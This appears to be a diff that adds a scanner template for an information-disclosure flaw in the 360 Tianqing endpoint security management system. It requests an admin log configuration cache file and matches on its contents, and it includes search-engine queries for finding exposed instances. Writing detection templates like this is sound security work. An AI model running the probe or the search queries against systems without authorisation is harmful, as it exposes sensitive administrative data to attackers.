@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - s:12:"/login/login"
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/runtime/admin_log_conf.cache'
+id: qianxin-360tianqing-adminlogconf-disclosure
+info:
+  author: zan8in
+  description: |-
+    fofa: title="360新天擎"
+    hunter: web.title="360新天擎"
+    zoomeye: app:"Tianqing terminal management"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 360新天擎终端安全管理系统信息泄露漏洞
+  severity: high
+  tags: qianxin,360tianqing,disclosure,argus-import
